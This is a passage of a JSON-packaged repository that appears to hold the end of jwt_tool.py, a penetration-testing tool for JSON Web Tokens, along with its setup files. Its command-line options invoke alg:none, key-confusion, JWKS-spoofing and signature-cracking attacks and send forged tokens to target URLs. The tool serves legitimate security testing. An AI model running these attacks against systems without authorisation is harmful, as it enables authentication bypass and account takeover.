\\x1b[0m\\x1b[48;5;24m \\x1b[0m |  \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\")\n    print(\"\\\\\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  /   \\\\\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |   \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |       \\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\\\\\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  |\\\\\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m  |\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m |\")\n    print(\" \\\\______/ \\\\__/     \\\\__|   \\\\__|\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\x1b[48;5;24m \\x1b[0m\\\\__| \\\\______/  \\\\______/ \\\\__|\")\n    print(\" \\x1b[36mVersion \"+jwttoolvers+\"          \\x1b[0m      \\\\______|             \\x1b[36m@ticarpi\\x1b[0m      \")\n    print()\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(epilog=\"If you don't have a token, try this one:\\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po\", formatter_class=argparse.RawTextHelpFormatter)\n    parser.add_argument(\"jwt\", nargs='?', type=str,\n                        help=\"the JWT to tinker with (no need to specify if in header/cookies)\")\n    parser.add_argument(\"-b\", \"--bare\", action=\"store_true\",\n                        help=\"return TOKENS ONLY\")\n    parser.add_argument(\"-t\", \"--targeturl\", action=\"store\",\n                        help=\"URL to send HTTP request to with new JWT\")\n    parser.add_argument(\"-r\", \"--request\", action=\"store\",\n                        help=\"URL request to base on\")\n    parser.add_argument(\"-i\", \"--insecure\", action=\"store_true\",\n                        help=\"Use HTTP for passed request\")\n    parser.add_argument(\"-rc\", \"--cookies\", action=\"store\",\n                        help=\"request cookies to send with the forged HTTP request\")\n    parser.add_argument(\"-rh\", \"--headers\", action=\"append\",\n                        help=\"request headers to send with the forged HTTP request (can be used multiple times for additional headers)\")\n    parser.add_argument(\"-pd\", \"--postdata\", action=\"store\",\n                        help=\"text string that contains all the data to be sent in a POST request\")\n    parser.add_argument(\"-cv\", \"--canaryvalue\", action=\"store\",\n                        help=\"text string that appears in response for valid token (e.g. \\\"Welcome, ticarpi\\\")\")\n    parser.add_argument(\"-np\", \"--noproxy\", action=\"store_true\",\n                        help=\"disable proxy for current request (change in jwtconf.ini if permanent)\")\n    parser.add_argument(\"-nr\", \"--noredir\", action=\"store_true\",\n                        help=\"disable redirects for current request (change in jwtconf.ini if permanent)\")\n    parser.add_argument(\"-M\", \"--mode\", action=\"store\",\n                        help=\"Scanning mode:\\npb = playbook audit\\ner = fuzz existing claims to force errors\\ncc = fuzz common claims\\nat - All Tests!\")\n    parser.add_argument(\"-X\", \"--exploit\", action=\"store\",\n                        help=\"eXploit known vulnerabilities:\\na = alg:none\\nn = null signature\\nb = blank password accepted in signature\\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\\nk = key confusion (specify public key with -pk)\\ni = inject inline JWKS\")\n    parser.add_argument(\"-ju\", \"--jwksurl\", action=\"store\",\n                        help=\"URL location where you can host a spoofed JWKS\")\n    parser.add_argument(\"-S\", \"--sign\", action=\"store\",\n                        help=\"sign the resulting token:\\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\\nes256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)\\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)\")\n    parser.add_argument(\"-pr\", \"--privkey\", action=\"store\",\n                        help=\"Private Key for Asymmetric crypto\")\n    parser.add_argument(\"-T\", \"--tamper\", action=\"store_true\",\n                        help=\"tamper with the JWT contents\\n(set signing options with -S or use exploits with -X)\")\n    parser.add_argument(\"-I\", \"--injectclaims\", action=\"store_true\",\n                        help=\"inject new claims and update existing claims with new values\\n(set signing options with -S or use exploits with -X)\\n(set target claim with -hc/-pc and injection values/lists with -hv/-pv\")\n    parser.add_argument(\"-hc\", \"--headerclaim\", action=\"append\",\n                        help=\"Header claim to tamper with\")\n    parser.add_argument(\"-pc\", \"--payloadclaim\", action=\"append\",\n                        help=\"Payload claim to tamper with\")\n    parser.add_argument(\"-hv\", \"--headervalue\", action=\"append\",\n                        help=\"Value (or file containing values) to inject into tampered header claim\")\n    parser.add_argument(\"-pv\", \"--payloadvalue\", action=\"append\",\n                        help=\"Value (or file containing values) to inject into tampered payload claim\")\n    parser.add_argument(\"-C\", \"--crack\", action=\"store_true\",\n                        help=\"crack key for an HMAC-SHA token\\n(specify -d/-p/-kf)\")\n    parser.add_argument(\"-d\", \"--dict\", action=\"store\",\n                        help=\"dictionary file for cracking\")\n    parser.add_argument(\"-p\", \"--password\", action=\"store\",\n                        help=\"password for cracking\")\n    parser.add_argument(\"-kf\", \"--keyfile\", action=\"store\",\n                        help=\"keyfile for cracking (when signed with 'kid' attacks)\")\n    parser.add_argument(\"-V\", \"--verify\", action=\"store_true\",\n                        help=\"verify the RSA signature against a Public Key\\n(specify -pk/-jw)\")\n    parser.add_argument(\"-pk\", \"--pubkey\", action=\"store\",\n                        help=\"Public Key for Asymmetric crypto\")\n    parser.add_argument(\"-jw\", \"--jwksfile\", action=\"store\",\n                        help=\"JSON Web Key Store for Asymmetric crypto\")\n    parser.add_argument(\"-Q\", \"--query\", action=\"store\",\n                        help=\"Query a token ID against the logfile to see the details of that request\\ne.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a\")\n    parser.add_argument(\"-v\", \"--verbose\", action=\"store_true\",\n                        help=\"When parsing and printing, produce (slightly more) verbose output.\")\n    args = parser.parse_args()\n    if not args.bare:\n        printLogo()\n    try:\n        path = os.path.expanduser(\"~/.jwt_tool\")\n        if not os.path.exists(path):\n            os.makedirs(path)\n    except:\n        path = sys.path[0]\n    logFilename = path+\"/logs.txt\"\n    configFileName = path+\"/jwtconf.ini\"\n    config = configparser.ConfigParser()\n    if (os.path.isfile(configFileName)):\n        config.read(configFileName)\n    else:\n        cprintc(\"No config file yet created.\\nRunning config setup.\", \"cyan\")\n        createConfig()\n    if config['services']['jwt_tool_version'] != jwttoolvers:\n        cprintc(\"Config file showing wrong version (\"+config['services']['jwt_tool_version']+\" vs \"+jwttoolvers+\")\", \"red\")\n        cprintc(\"Current config file has been backed up as '\"+path+\"/old_(\"+config['services']['jwt_tool_version']+\")_jwtconf.ini' and a new config generated.\\nPlease review and manually transfer any custom options you have set.\", \"red\")\n        os.rename(configFileName, path+\"/old_(\"+config['services']['jwt_tool_version']+\")_jwtconf.ini\")\n        createConfig()\n        exit(1)\n    with open(path+\"/null.txt\", 'w') as nullfile:\n        pass\n    findJWT = \"\"\n\n    if args.request:\n        port = ''\n\n        with open(args.request, 'r') as file:\n            first_line = file.readline().strip()\n            method, first_line_remainder = first_line.split(' ', 1)\n            url = first_line_remainder.split(' ', 1)[0]\n            base_url = ''\n        \n            in_headers = True\n            args.postdata = ''\n\n            for line in file:\n                \n                line = line.strip()\n                if not line:\n                    # Stop when reaching an empty line (end of headers)\n                    in_headers = False\n                    continue\n\n                if in_headers:\n                    if line.lower().startswith('host:'):\n                        # Extract the host from the 'Host' header\n                        _, host = line.split(':', 1)\n                        host = host.strip()\n                        \n                        if ':' in host:\n                            host, port = host.split(':', 1)\n\n                        protocol = \"http\" if args.insecure else \"https\"\n\n                        base_url = f\"{protocol}://{host}\"\n                        \n                    elif line.lower().startswith('cookie:'):\n                        cookie = line.split(': ')[1]\n                        if not args.cookies:\n                            args.cookies = ''\n                        args.cookies += cookie\n                    else:\n                        # Don't add user agent field, otherwise 'jwt_tool' in user agent will not work\n                        if not line.lower().startswith('user-agent:'):\n                            if not args.headers:\n                                args.headers = []\n                            args.headers.append(line)\n                else:\n                    args.postdata += line\n\n            if not port:\n                url_object = urlparse(url)\n                if url_object.port:\n                    port = str(url_object.port)\n\n        absolute_url = urljoin(base_url + (':' + port if port else ''), url)\n        args.targeturl = absolute_url\n\n    if args.targeturl:\n        if args.cookies or args.headers or args.postdata:\n            jwt_count = 0\n            jwt_locations = []\n\n            if args.cookies and re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', args.cookies):\n                jwt_count += 1\n                jwt_locations.append(\"cookie\")\n\n            if args.headers and re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', str(args.headers)):\n                jwt_count += 1\n                jwt_locations.append(\"headers\")\n\n            if args.postdata and re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', str(args.postdata)):\n                jwt_count += 1\n                jwt_locations.append(\"post data\")\n\n            if jwt_count > 1:\n                cprintc(\"Too many tokens! JWT in more than one place: cookie, header, POST data\", \"red\")\n                exit(1)\n\n            if args.cookies:\n                try:\n                    if re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', args.cookies):\n                        config['argvals']['headerloc'] = \"cookies\"\n                except:\n                    cprintc(\"Invalid cookie formatting\", \"red\")\n                    exit(1)\n\n            if args.headers:\n                try:\n                    if re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', str(args.headers)):\n                        config['argvals']['headerloc'] = \"headers\"\n                except:\n                    cprintc(\"Invalid header formatting\", \"red\")\n                    exit(1)\n\n            if args.postdata:\n                try:\n                    if re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', str(args.postdata)):\n                        config['argvals']['headerloc'] = \"postdata\"\n                except:\n                    cprintc(\"Invalid postdata formatting\", \"red\")\n                    exit(1)\n\n            searchString = \" | \".join([\n                str(args.cookies),\n                str(args.headers),\n                str(args.postdata)\n            ])\n            \n            try:\n                findJWT = re.search(r'eyJ[A-Za-z0-9_\\/+-]*\\.eyJ[A-Za-z0-9_\\/+-]*\\.[A-Za-z0-9._\\/+-]*', searchString)[0]\n            except:\n                cprintc(\"Cannot find a valid JWT\", \"red\")\n                cprintc(searchString, \"cyan\")\n                exit(1)\n    if args.query:\n        jwt = searchLog(args.query)\n    elif args.jwt:\n        jwt = args.jwt\n        cprintc(\"Original JWT: \"+findJWT+\"\\n\", \"cyan\")\n    elif findJWT:\n        jwt = findJWT\n        cprintc(\"Original JWT: \"+findJWT+\"\\n\", \"cyan\")\n    else:\n        parser.print_usage()\n        cprintc(\"No JWT provided\", \"red\")\n        exit(1)\n    if args.mode:\n        if args.mode not in ['pb','er', 'cc', 'at']:\n            parser.print_usage()\n            cprintc(\"\\nPlease choose a scanning mode (e.g. -M pb):\\npb = playbook\\ner = force errors\\ncc = fuzz common claims\\nat = all tests\", \"red\")\n            exit(1)\n        else:\n            config['argvals']['scanMode'] = args.mode\n    if args.exploit:\n        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k']:\n            parser.print_usage()\n            cprintc(\"\\nPlease choose an exploit (e.g. -X a):\\na = alg:none\\nn = null signature\\nb = blank password accepted in signature\\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\\nk = key confusion (specify public key with -pk)\\ni = inject inline JWKS\", \"red\")\n            exit(1)\n        else:\n            config['argvals']['exploitType'] = args.exploit\n    if args.sign:\n        if args.sign not in ['hs256','hs384','hs512','rs256','rs384','rs512','es256','es384','es512','ps256','ps384','ps512']:\n            parser.print_usage()\n            cprintc(\"\\nPlease choose a signature option (e.g. -S hs256)\", \"red\")\n            exit(1)\n        else:\n            config['argvals']['sigType'] = args.sign\n    headDict, paylDict, sig, contents = validateToken(jwt)\n    paylB64 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(\",\",\":\")).encode()).decode('UTF-8').strip(\"=\")\n    config['argvals']['overridesub'] = \"false\"\n    if args.targeturl:\n        config['argvals']['targetUrl'] = args.targeturl.replace('%','%%')\n    if args.cookies:\n        config['argvals']['cookies'] = args.cookies\n    if args.headers:\n        config['argvals']['header'] = str(args.headers)\n    if args.dict:\n        config['argvals']['keyList'] = args.dict\n    if args.keyfile:\n        config['argvals']['keyFile'] = args.keyfile\n    if args.password:\n        config['argvals']['key'] = args.password\n    if args.pubkey:\n        config['crypto']['pubkey'] = args.pubkey\n    if args.privkey:\n        config['crypto']['privkey'] = args.privkey\n    if args.jwksfile:\n        config['crypto']['jwks'] = args.jwksfile\n    if args.jwksurl:\n        config['services']['jwksloc'] = args.jwksurl\n    if args.payloadclaim:\n        config['argvals']['payloadclaim'] = str(args.payloadclaim)\n    if args.headerclaim:\n        config['argvals']['headerclaim'] = str(args.headerclaim)\n    if args.payloadvalue:\n        config['argvals']['payloadvalue'] = str(args.payloadvalue)\n    if args.headervalue:\n        config['argvals']['headervalue'] = str(args.headervalue)\n    if args.postdata:\n        config['argvals']['postData'] = args.postdata\n    if args.canaryvalue:\n        config['argvals']['canaryvalue'] = args.canaryvalue\n    if args.noproxy:\n        config['services']['proxy'] = \"False\"\n    if args.noredir:\n        config['services']['redir'] = \"False\"\n    if args.request:\n        config['argvals']['request'] = args.request\n\n    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.injectclaims:\n        rejigToken(headDict, paylDict, sig)\n        if args.sign:\n            signingToken(headDict, paylDict)\n    if args.injectclaims:\n        injectionfile = \"\"\n        newheadDict = headDict\n        newpaylDict = paylDict\n        if args.headerclaim:\n            if not args.headervalue:\n                cprintc(\"Must specify header values to match header claims to inject.\", \"red\")\n                exit(1)\n            if len(args.headerclaim) != len(args.headervalue):\n                cprintc(\"Amount of header values must match header claims to inject.\", \"red\")\n                exit(1)\n        if args.payloadclaim:\n            if not args.payloadvalue:\n                cprintc(\"Must specify payload values to match payload claims to inject.\", \"red\")\n                exit(1)\n            if len(args.payloadclaim) != len(args.payloadvalue):\n                cprintc(\"Amount of payload values must match payload claims to inject.\", \"red\")\n                exit(1)\n        if args.payloadclaim:\n            for payloadclaim, payloadvalue in zip(args.payloadclaim, args.payloadvalue):\n                if os.path.isfile(payloadvalue):\n                    injectionfile = [\"payload\", payloadclaim, payloadvalue]\n                else:\n                    newpaylDict, newPaylB64 = injectpayloadclaim(payloadclaim, payloadvalue)\n                    paylB64 = newPaylB64\n            newContents = genContents(headDict, newpaylDict)\n            headDict, paylDict, sig, contents = validateToken(newContents+\".\"+sig)\n        if args.headerclaim:\n            for headerclaim, headervalue in zip(args.headerclaim, args.headervalue):\n                if os.path.isfile(headervalue):\n                    injectionfile = [\"header\", headerclaim, headervalue]\n                else:\n                    newheadDict, newHeadB64 = injectheaderclaim(headerclaim, headervalue)\n                    newContents = genContents(newheadDict, paylDict)\n                    headDict, paylDict, sig, contents = validateToken(newContents+\".\"+sig)\n        if injectionfile:\n            if args.mode:\n                cprintc(\"Fuzzing cannot be used alongside scanning modes\", \"red\")\n                exit(1)\n            cprintc(\"Fuzzing file loaded: \"+injectionfile[2], \"cyan\")\n            with open(injectionfile[2], \"r\", encoding='utf-8', errors='ignore') as valLst:\n                nextVal = valLst.readline()\n                cprintc(\"Generating tokens from injection file...\", \"cyan\")\n                utf8errors = 0\n                wordcount = 0\n                while nextVal:\n                    if injectionfile[0] == \"payload\":\n                        newpaylDict, newPaylB64 = injectpayloadclaim(injectionfile[1], nextVal.rstrip())\n                        newContents = genContents(headDict, newpaylDict)\n                        headDict, paylDict, sig, contents = validateToken(newContents+\".\"+sig)\n                        paylB64 = newPaylB64\n                    elif injectionfile[0] == \"header\":\n                        newheadDict, newHeadB64 = injectheaderclaim(injectionfile[1], nextVal.rstrip())\n                        newContents = genContents(newheadDict, paylDict)\n                        headDict, paylDict, sig, contents = validateToken(newContents+\".\"+sig)\n                    injectOut(newheadDict, newpaylDict)\n                    nextVal = valLst.readline()\n            exit(1)\n        else:\n            if not args.mode:\n                injectOut(newheadDict, newpaylDict)\n                exit(1)\n    if args.mode:\n        if not config['argvals']['targeturl'] and not args.bare:\n            cprintc(\"No target secified (-t), cannot scan offline.\", \"red\")\n            exit(1)\n        runScanning()\n    runActions()\n    exit(1)\n"
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.041015625,
          "content": "termcolor\r\ncprint\r\npycryptodomex\r\nrequests"
        },
        {
          "name": "setup.txt",
          "type": "blob",
          "size": 0.171875,
          "content": "git clone https://github.com/ticarpi/jwt_tool\r\ncd jwt_tool\r\nsudo apt install python3-pip\r\npython3 -m pip install termcolor cprint pycryptodomex requests\r\nchmod +x jwt_tool.py\r\n"
        }
      ]
    }
  ]
}